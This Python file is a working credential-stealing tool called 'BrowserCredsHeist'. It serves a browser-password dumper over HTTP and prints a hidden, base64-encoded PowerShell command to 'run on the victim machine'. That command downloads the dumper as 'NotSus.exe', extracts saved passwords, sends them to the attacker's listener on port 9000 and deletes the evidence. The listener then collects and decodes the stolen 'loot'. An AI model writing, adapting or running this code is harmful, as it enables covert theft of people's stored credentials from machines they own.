import socket
import os
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import threading
import base64
from colorama import Fore, Back, Style

#To be honest probably about 60% of this code is from ChatGPT. The Powershell is all mine though. Thanks to NirSoft for the exe file.

def encode_powershell_command(command):
    encoded_bytes = base64.b64encode(command.encode('utf-16-le'))
    encoded_string = encoded_bytes.decode('utf-8')

    return encoded_string

class CustomRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Disable logging of HTTP requests (optional)
        return


# Create a subclass of HTTPServer with ThreadingMixIn
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass

# Function to start the HTTP server in a separate thread
def start_http_server(directory, port):
    # Change to the user-provided root directory
    os.chdir(directory)  
    server_address = ('', port)
    httpd = ThreadedHTTPServer(server_address, CustomRequestHandler)
    #print('HTTP server is running on port', port)
    httpd.serve_forever()


if __name__ == '__main__':
    # Defining Socket
    host = '0.0.0.0'
    port = 9000
    totalclient = int(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(totalclient)

    fileno = 0
    http_server_thread = None

    #Print sick ascii art
    print(Fore.RED +
'''
  ____                                   _____              _     _    _      _     _
 |  _ \                                 / ____|            | |   | |  | |    (_)   | |
 | |_) |_ __ _____      _____  ___ _ __| |     _ __ ___  __| |___| |__| | ___ _ ___| |_
 |  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__| |    | '__/ _ \/ _` / __|  __  |/ _ \ / __| __|
 | |_) | | | (_) \ V  V /\__ \  __/ |  | |____| | |  __/ (_| \__ \ |  | |  __/ \__ \ |_
 |____/|_|  \___/ \_/\_/ |___/\___|_|   \_____|_|  \___|\__,_|___/_|  |_|\___|_|___/\__|


'''
)
    print(Style.RESET_ALL)
    try:
        # Get user input for the root directory
        root_directory = input('Enter the root directory for the HTTP server: ')
        http_port = input("Enter the local port for the HTTP server: ")
        http_ip = input("Enter domain/IP for  HTTP server: ")
        #Generate the powershell command maybe
        powershell = "$URL = 'http://" + http_ip + ":" + http_port + "/Browser.exe';$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile($URL, 'NotSus.exe');.\\NotSus.exe /stext 'Pass.txt';Start-Sleep -Seconds 2;$test=[System.Convert]::ToBase64String([io.file]::ReadAllBytes('Pass.txt'));$socket = New-Object net.sockets.tcpclient('" + http_ip + "',9000);$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$writer.WriteLine($test);$socket.close();Remove-Item 'NotSus.exe';Remove-Item 'Pass.txt';"
        encoded_command = encode_powershell_command(powershell)
        print(
        '''
        Run the following command on the victim machine
        ===============================================
        '''
        )
        print("powershell.exe -WindowStyle hidden -e " + encoded_command)
        # Start the HTTP server in a separate thread
        http_server_thread = threading.Thread(target=start_http_server, args=(root_directory, int(http_port)))
        http_server_thread.start()
        print('\nHTTP server is running on port', http_port)

        while True:
            print("Waiting for loot on port 9000...\n")
            # Accepting client connection
            conn, addr = sock.accept()
            print('Connected with client:', addr)

            # Receiving File Data
            data = conn.recv(1024).decode()

            if not data:
                continue

            # Creating a new file at server end and writing the data
            filename = 'output' + str(fileno) + '.txt'
            fileno += 1
            with open(filename, 'w') as fo:
                while data:
                    if not data:
                        break
                    else:
                        fo.write(data)
                        data = conn.recv(1024).decode()

            print('Received file from client')
            conn.close()

            NewName = "Decoded" + str(fileno)
            os.system("cat " + filename + " | base64 -d > " + NewName + ".txt")
            time.sleep(1)
            os.system("tr < " + NewName + ".txt -d '\\000' > " + NewName + "-NoNulls.txt")
            os.system("rm " + NewName + ".txt")
            print('File decoded as ' + NewName + '-NoNulls.txt\n')

    except KeyboardInterrupt:
        print('Program interrupted. Exiting...')

    finally:
        sock.close()
        if http_server_thread:
            http_server_thread.join()
